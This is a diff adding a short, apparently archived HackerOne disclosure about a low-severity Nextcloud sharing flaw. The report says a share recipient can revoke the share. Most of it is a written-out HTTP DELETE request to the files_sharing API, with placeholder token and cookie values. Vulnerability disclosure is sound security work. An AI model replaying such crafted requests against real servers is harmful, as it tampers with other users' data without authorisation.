@@ -1,0 +1,34 @@
+ReportLink:https://hackerone.com/reports/153905
+WeaknessName:Privilege Escalation
+Reporter:https://hackerone.com/dalt
+ReportedTo:Nextcloud(nextcloud)
+BountyAmount:100.0
+Severity:low
+State:Closed
+DateOfDisclosure:03.12.2016 21:58:44
+
+Summary:
+
+Decription:
+-----
+Users are shared files or folder. can disable this sharing.
+
+Detail:
+------
+ + use request:
+
+DELETE /nextcloud/ocs/v2.php/apps/files_sharing/api/v1/shares/[share-id]?format=json HTTP/1.1
+Host: [your-host]
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+requesttoken: [token of user is shared]
+OCS-APIREQUEST: true
+X-Requested-With: XMLHttpRequest
+Cookie: [cookie of user is shared]
+Connection: keep-alive
+
+Note:
+----
+only user is shared or user in group is shared can do it
